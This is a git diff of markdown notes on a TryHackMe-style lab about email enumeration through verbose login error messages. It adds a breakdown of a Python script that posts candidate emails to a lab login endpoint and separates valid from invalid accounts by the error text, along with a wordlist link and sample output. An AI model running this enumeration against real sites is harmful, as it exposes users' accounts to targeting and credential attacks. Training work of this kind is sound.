@@ -33,20 +33,22 @@ When it comes to breaching authentication, enumeration and brute forcing often g
 In summary, verbose errors are like breadcrumbs leading attackers deeper into the system, providing them with the insights needed to tailor their strategies and potentially compromise security in ways that could go undetected until it’s too late.
 
 ### Enumeration in Authentication Forms
-In this HackerOne [report](https://hackerone.com/reports/1166054)  , the attacker was able to enumerate users using the website's Forget Password function. Similarly, we can also enumerate emails in login forms. For example, navigate to [http://enum.thm/labs/verbose_login/] (http://enum.thm/labs/verbose_login/) and put any email address in the Email input field.
+In this HackerOne [report](https://hackerone.com/reports/1166054)  , the attacker was able to enumerate users using the website's Forget Password function. Similarly, we can also enumerate emails in login forms. For example, navigate to http://enum.thm/labs/verbose_login/ and put any email address in the Email input field.
 
 When you input an invalid email, the website will respond with **"Email does not exist."** indicating that the email has not been registered yet.
 
-|![image](https://github.com/user-attachments/assets/9ac2b060-2871-495f-b7c4-778c877f5feb)
-Email does not exist error message|
+|![image](https://github.com/user-attachments/assets/9ac2b060-2871-495f-b7c4-778c877f5feb)|
+|-----------|
+|Email does not exist error message|
 
 However, if the email is already registered, the website will respond with an "Invalid password" error message, indicating that the email exists in the database but the password is incorrect.
 
-![image](https://github.com/user-attachments/assets/6550d52c-669c-4838-9865-cf217dc75c28)
-Invalid password error message
+![image](https://github.com/user-attachments/assets/6550d52c-669c-4838-9865-cf217dc75c28)|
+|-----------|
+|Invalid password error message|
 
 ### Automation
-Below is a Python script that will check for valid emails in the target web app. Save the code below as script.py.
+Below is a Python script that will check for valid emails in the target web app. Save the code below as **`script.py`**.
 
 ```python
 import requests
@@ -106,16 +108,21 @@ if __name__ == "__main__":
     print("\nValid emails found:")
     for valid_email in valid_emails:
         print(valid_email)
-Click here for a breakdown of the script.
-We can use a common list of emails from this repository.
+```
 
-Usernames list from github
+We can use a common list of emails from this [repository] (https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).
+
+
+|![image](https://github.com/user-attachments/assets/2f6f1898-1d74-471e-b273-2f9ffd35abd4)|
+|-----------|
+|Usernames list from github|
 
 Once you've downloaded the payload list, use the script on the AttackBox or your own machine to check for valid email addresses.
 
-Note: As a reminder, we strongly advise using the AttackBox for this task.
+**Note: As a reminder, we strongly advise using the AttackBox for this task.**
 
-script.py
+```bash
+🔴🟢🟡                        #script.py
 user@tryhackme $ python3 script.py usernames_gmail.com.txt
 [INVALID] xxxxxx@gmail.com
 [INVALID] xxxxxx@gmail.com
@@ -136,4 +143,72 @@ user@tryhackme $ python3 script.py usernames_gmail.com.txt
 ```
 
 or use the script from: 
+https://github.com/yen5004/THM_ENUM/blob/a6d16379ea80ea8d3c354aee334c428c3935acb4/valid_email_script.py
 
+### Script Breakdown
+
+**Imports:**
+  +  **requests:** A Python library for making HTTP requests. This is used to interact with the web server by sending POST requests to the target endpoint.
+  +    import requests
+
+**Setup:**
+  +  **url:** The script targets the endpoint handling the login functionality of the application.
+  ```  
+    url = 'http://enum.thm/labs/verbose_login/functions.php'
+  ```
+  +  **headers:** A collection of HTTP headers is defined to mimic a typical browser request, ensuring the requests appear legitimate.
+```
+headers = {
+      'Host': 'enum.thm',
+      'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
+      'Accept': 'application/json, text/javascript, */*; q=0.01',
+      'Accept-Language': 'en-US,en;q=0.5',
+      'Accept-Encoding': 'gzip, deflate',
+      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+      'X-Requested-With': 'XMLHttpRequest',
+      'Origin': 'http://enum.thm',
+      'Connection': 'close',
+      'Referer': 'http://enum.thm/labs/verbose_login/',
+  }
+```
+**Variables Initialization:**
+
+  +  **valid_emails:** An array stores email addresses confirmed to be valid.
+    ```valid_emails = []```
+  +  **invalid_error:** A string contains the specific error message used to identify invalid emails.
+    ```invalid_error = 'Email does not exist'```
+
+**Main Loop:**
+
++  The script reads email addresses from a provided file and checks each for validity using the **`check_email`** function.
+```
+for email in email_list:
+    check_email(email)
+```
+
+**Crafting and Sending HTTP Requests:**
+
++  For each email, the script constructs a data dictionary that includes the email address, a placeholder password, and a command to execute the 'login' function.
+```
+data = {'username': email, 'password': 'password', 'action': 'login'}
+response = requests.post(url, headers=headers, data=data)
+```
+
+**Response Handling:**
+
++  The response from the server is processed to check if the provided email exists, based on the presence of the specific error message in the JSON data.
+```
+if invalid_error in response.text:
+    print(f"{email} is invalid.")
+else:
+    print(f"{email} is valid.")
+    valid_emails.append(email)
+```
+
+**Character Verification:**
+
++  Emails confirmed to exist are added to the **`valid_emails list`**, with each email's validity logged to the console.
+```
+for email in valid_emails:
+    print(f"Valid email found: {email}")
+```
